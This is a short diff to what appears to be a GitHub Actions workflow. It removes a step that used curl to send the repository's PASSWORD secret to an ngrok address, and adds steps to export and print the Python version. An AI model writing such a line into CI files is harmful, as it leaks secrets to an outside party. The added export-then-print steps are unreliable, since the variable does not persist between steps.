@@ -9,5 +9,6 @@ jobs:
       - name: Echo
         run: |
           echo "hi"
-          python --version
-          curl http://7223bb061f0d.ngrok.io/${{SECRETS.PASSWORD}}
+          export PYTHON_VERSION=$(python --version)
+      - name: Print Python Version
+        run: echo $PYTHON_VERSION
